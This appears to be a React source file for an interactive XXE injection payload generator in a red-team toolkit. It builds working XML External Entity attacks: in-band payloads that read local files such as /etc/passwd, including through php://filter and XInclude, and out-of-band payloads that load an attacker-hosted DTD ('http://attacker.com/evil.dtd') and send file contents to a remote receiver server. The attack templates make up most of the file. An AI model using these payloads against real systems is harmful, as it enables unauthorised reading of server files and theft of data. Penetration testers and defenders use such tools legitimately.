import React, { useState } from 'react';
import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
import { ToolHeader } from '../ui/ToolHeader';
import { FileCode, Copy, Check, Info, Settings } from 'lucide-react';

export default function XXETool() {
    const [activeTab, setActiveTab] = useState('inband');
    const [config, setConfig] = useState({
        resource: 'file:///etc/passwd',
        dtdPath: 'http://attacker.com/evil.dtd',
        remoteServer: 'http://attacker.com/'
    });
    const [showToast, setShowToast] = useState(false);

    const tabs = [
        { id: 'inband', label: 'In-Band (Basic)' },
        { id: 'oob', label: 'Out-of-Band (Blind)' },
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setConfig(prev => ({ ...prev, [name]: value }));
    };

    const formatPayload = (template: string) => {
        return template
            .replace('{RESOURCE}', config.resource)
            .replace('{DTD_PATH}', config.dtdPath)
            .replace('{REMOTE_SERVER}', config.remoteServer);
    };

    const INBAND_PAYLOADS = [
        {
            name: 'Basic XML Entity',
            desc: 'Classic local file inclusion via entity',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{RESOURCE}"> ]>
<foo>&xxe;</foo>`
        },
        {
            name: 'PHP Filter Wrapper',
            desc: 'Bypass filters using php:// wrapper (Base64)',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={RESOURCE}"> ]>
<foo>&xxe;</foo>`
        },
        {
            name: 'XInclude',
            desc: 'XInclude attack when DOCTYPE is disabled',
            template: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="{RESOURCE}"/>
</foo>`
        }
    ];

    const OOB_PAYLOADS = [
        {
            name: 'Blind XXE (External DTD)',
            desc: 'Load external DTD to exfiltrate data',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY % xxe SYSTEM "{DTD_PATH}"> 
  %xxe; 
]>`
        },
        {
            name: 'Malicious DTD File',
            desc: 'Content of evil.dtd to host on attacker server',
            template: `<!ENTITY % file SYSTEM "{RESOURCE}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{REMOTE_SERVER}?x=%file;'>">
%eval;
%exfil;`
        },
        {
            name: 'Parameter Entity OOB',
            desc: 'Trigger OOB DNS lookup',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{REMOTE_SERVER}"> %xxe; ]>`
        }
    ];

    return (
        <div className="space-y-6">
            <ToolHeader
                title="XXE Injection Builder"
                description="Interactive XML External Entity payload generator"
                badge="RT"
                icon={<FileCode size={24} />}
            />

            <Card className="!p-6 space-y-4 border-l-4 border-l-htb-green">
                <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider flex items-center gap-2">
                    <Settings size={16} /> Configuration
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Target Resource (File/URL)</label>
                        <Input
                            name="resource"
                            value={config.resource}
                            onChange={handleChange}
                            placeholder="file:///etc/passwd"
                        />
                    </div>
                    {activeTab === 'oob' && (
                        <>
                            <div className="space-y-2">
                                <label className="text-xs font-medium text-gray-400">Attacker DTD URL</label>
                                <Input
                                    name="dtdPath"
                                    value={config.dtdPath}
                                    onChange={handleChange}
                                    placeholder="http://attacker.com/evil.dtd"
                                />
                            </div>
                            <div className="space-y-2">
                                <label className="text-xs font-medium text-gray-400">Receiver Server</label>
                                <Input
                                    name="remoteServer"
                                    value={config.remoteServer}
                                    onChange={handleChange}
                                    placeholder="http://attacker.com/"
                                />
                            </div>
                        </>
                    )}
                </div>
            </Card>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            <div className="space-y-4">
                {(activeTab === 'inband' ? INBAND_PAYLOADS : OOB_PAYLOADS).map((item, idx) => {
                    const finalPayload = formatPayload(item.template);
                    return (
                        <Card key={idx} className="!p-4 hover:border-htb-green/50 transition-colors">
                            <div className="flex flex-col gap-3">
                                <div>
                                    <h4 className="text-sm font-bold text-htb-green">{item.name}</h4>
                                    <p className="text-xs text-gray-400">{item.desc}</p>
                                </div>
                                <PayloadBlock content={finalPayload} />
                            </div>
                        </Card>
                    );
                })}
            </div>

            {/* Toast Notification */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
